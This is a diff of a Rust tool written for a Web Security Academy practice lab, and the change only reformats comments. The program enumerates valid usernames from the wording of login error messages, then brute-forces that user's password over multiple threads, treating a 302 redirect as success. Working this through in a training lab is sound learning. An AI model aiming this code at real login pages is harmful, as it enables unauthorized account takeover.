@@ -59,46 +59,67 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a05005e049bcd7980fca3e300e3002d.web-security-academy.net/login"; // change this to you lab url
-    let client = build_client(); // client will be used on subsequent requests
+    // change this to your lab URL
+    let url = "https://0a05005e049bcd7980fca3e300e3002d.web-security-academy.net/login";
 
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // read usernames as one big string
+    // change the path to your usrename list
     let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();
-    // change the path to ure usrenames list
-    let usernames = usernames_big_string.split("\n").collect(); // change split to \r\n if you are still a windows user
 
+    // split the big string to a list of usernames
+    // change the separator to \r\n if you are still a windows user
+    let usernames = usernames_big_string.split("\n").collect();
+
+    // read passwords as one big string
+    // change the path to your password list
     let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
-    // change the path to ure passwords list
-    let passwords = passwords_big_string.split("\n").collect(); // change split to \r\n if you are still a windows user
 
-    let start_time = time::Instant::now(); // capture the time before brute forcing
+    // split the big string to a list of passwords
+    // change the separator to \r\n if you are still a windows user
+    let passwords = passwords_big_string.split("\n").collect();
+
+    // capture the time before brute forcing
+    let start_time = time::Instant::now();
 
     // start enumeration
-    enum_usernames(start_time, url, &client, usernames, 8); // you can chagne the number of threads
+    // 8 is the number of threads, you can change it
+    enum_usernames(start_time, url, &client, usernames, 8);
 
+    // if a valid username is found
     if VALID_USER.lock().unwrap().len() != 0 {
-        // if a valid username is found
+        // start brute force his password
+        // 8 is the number of threads, you can change it
         brute_force_password(
-            // start brure force his password
             start_time,
             url,
             &client,
             passwords,
             VALID_USER.lock().unwrap().as_str(),
-            8, // you can change the number of threads
+            8,
         );
 
+        // if a valid password is found
         if VALID_PASSWORD.lock().unwrap().len() != 0 {
-            // if a valid password is found
-            print_valid_credentials(); // print valid credentials
+            print_valid_credentials();
         } else {
             println!("\n{}", "[!] Couldn't find valid password".red());
         }
     } else {
         println!("\n{}", "[!] Couldn't find valid username".red());
     }
-    print_finish_message(start_time); // print finish time
-    print_failed_requests(); // some request will be failed due to unknow reseaon; print them after you finish to try them latere
-    save_results(start_time, "results"); // save resultes to a file in the current working directory. you can change this name to what you want
+    // print some useful information to the terminal
+    print_finish_message(start_time); 
+    
+    // some request will be failed due to unknow reseaon
+    // print them after you finish to try them latere
+    print_failed_requests(); 
+    
+    // save results  to a file in the current working directory
+    // you can change this name to what you want
+    save_results(start_time, "results"); 
 }
 
 /*******************************************************************
@@ -130,20 +151,33 @@ fn enum_usernames(
     threads: usize,
 ) {
     println!("[#] Enumerate usernames..");
-    let chunk_per_thread = usernames.len() / threads; // how many users will be tried in each thread
-    let usernames_chunks: Vec<_> = usernames.chunks(chunk_per_thread).collect(); // split the whole list to sublist to run each one in a thread
-    let regex = Regex::new("Invalid username").unwrap(); // the pattern to search for in the response
+    // how many users will be tried in each thread
+    let chunk_per_thread = usernames.len() / threads; 
+    
+    // split the whole list to sublist to run each one in a thread
+    let usernames_chunks: Vec<_> = usernames.chunks(chunk_per_thread).collect(); 
+    
+    // the pattern to search for in the response
+    let regex = Regex::new("Invalid username").unwrap(); 
 
+    // run every sublist in a thread
     usernames_chunks.par_iter().for_each(|mini_list| {
-        // run every sublist in a thread
-        let total_counts = usernames.iter().count(); // get the total count of the usernamse
+        // get the total count of the usernamse
+        let total_counts = usernames.iter().count(); 
+        
+        // iterate over every sublist in its corresponding thread
         for (index, user) in mini_list.iter().enumerate() {
-            // iterate over every sublist in its corresponding thread
+            // iterate only if no valid user is found
             if VALID_USER.lock().unwrap().len() == 0 {
-                // iterate only if no valid user is found
-                let success_counter = USERS_COUNTER.fetch_add(0, Ordering::Relaxed); // number of succeeded requests
-                let fail_counter = FAILED_USERS_COUNTER.fetch_add(0, Ordering::Relaxed); // number of failed requests
+                // get number of succeeded requests
+                let success_counter = USERS_COUNTER.fetch_add(0, Ordering::Relaxed); 
+                
+                // get number of failed requests
+                let fail_counter = FAILED_USERS_COUNTER.fetch_add(0, Ordering::Relaxed); 
+
+                // calculate the elapsed time
                 let elapsed_time = start_time.elapsed().as_secs() / 60;
+                
                 // print the progress based on the updated informations
                 print_progress(
                     elapsed_time,
@@ -152,16 +186,29 @@ fn enum_usernames(
                     total_counts,
                     user,
                 );
-                let data = HashMap::from([("username", user), ("password", &"not important now")]); // the data sent in the POST login request
-                let mut login = client.post(url).form(&data).send(); // try to login
+                
+                // the data sent in the POST login request
+                let data = HashMap::from([("username", user), ("password", &"not important now")]); 
+                
+                // try to login
+                let mut login = client.post(url).form(&data).send(); 
+                
+                // check if the request was sent successfully
                 if let Ok(res) = login {
-                    // check if the request was sent successfully
-                    USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to the succeeded counter
-                    let body = &res.text().unwrap(); // get the body of the response
-                    let pattern_existance = regex.find(body); // search for the pattern
+                    // add 1 to the succeeded counter
+                    USERS_COUNTER.fetch_add(1, Ordering::Relaxed); 
+                    
+                    // get the body of the response
+                    let body = &res.text().unwrap(); 
+                    
+                    // search for the pattern
+                    let pattern_existance = regex.find(body); 
+                    
+                    // if the patttern doesn't exist
                     if pattern_existance.is_none() {
-                        // if the patttern doesn't exist
-                        VALID_USER.lock().unwrap().push_str(user); // change this global varaible to the valid user; this is the thread-safe operation using mutexes
+                        // change this global varaible to the valid user
+                        // this is the thread-safe operation using mutexes
+                        VALID_USER.lock().unwrap().push_str(user); 
                     }
                 } else {
                     // if the request faild for unknown reason try to send it again
@@ -175,8 +222,10 @@ fn enum_usernames(
                         }
                     } else {
                         // if the second try to send the request also faild
-                        FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to failed counter
-                        FAILED_USERS.lock().unwrap().push(user.to_string()); // save this user to a list to try it later
+                        // add 1 to failed counter
+                        FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); 
+                        // save this user to a list to try it later
+                        FAILED_USERS.lock().unwrap().push(user.to_string()); 
                     }
                 }
             } else {
@@ -211,20 +260,30 @@ fn brute_force_password(
         valid_user.green().bold()
     );
     println!("[#] Brute forcing password..");
-    let chunk_per_thread = passwords.len() / threads; // how many passwords will be tried in each thread
-    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect(); // split the whole list to sublist to run each one in a thread
+    // how many passwords will be tried in each thread
+    let chunk_per_thread = passwords.len() / threads; 
+    
+    // split the whole list to sublist to run each one in a thread
+    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect(); 
 
     // run every sublist in a thread
     passwords_chunks.par_iter().for_each(|mini_list| {
-        let total_counts = passwords.iter().count(); // total number of passwords that will be tried
+        // total number of passwords that will be tried
+        let total_counts = passwords.iter().count(); 
 
         // iterate over every sublist in its corresponing thread
         for (index, password) in mini_list.iter().enumerate() {
             // iterate only if no valid password is found
             if VALID_PASSWORD.lock().unwrap().len() == 0 {
-                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter to output in the terminal
-                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // update the failed counter to output in the terminal
+                // update the success counter to output in the terminal
+                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); 
+                
+                // update the failed counter to output in the terminal
+                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
+
+                // calculate the elapsed time 
                 let elapsed_time = start_time.elapsed().as_secs() / 60;
+
                 // print the updated information to the terminal
                 print_progress(
                     elapsed_time,
@@ -233,13 +292,20 @@ fn brute_force_password(
                     total_counts,
                     password,
                 );
-                let data = HashMap::from([("username", valid_user), ("password", password)]); // the POST date to submit
-                let mut login = client.post(url).form(&data).send(); // try to login
+                
+                // the POST date to submit
+                let data = HashMap::from([("username", valid_user), ("password", password)]); 
+                
+                // try to login
+                let mut login = client.post(url).form(&data).send(); 
+                
+                // if the request succeeded
                 if let Ok(res) = login {
-                    // if the request succeeded
+                    // if the password is true
                     if res.status().as_u16() == 302 {
-                        // if the password is true
-                        VALID_PASSWORD.lock().unwrap().push_str(password) // update the global variable to the valid password; this is a thread-safe operation using mutexes
+                        // update the global variable to the valid password
+                        // this is a thread-safe operation using mutexes
+                        VALID_PASSWORD.lock().unwrap().push_str(password) 
                     }
                 } else {
                     // if the request faild for unknown reason try to send it again
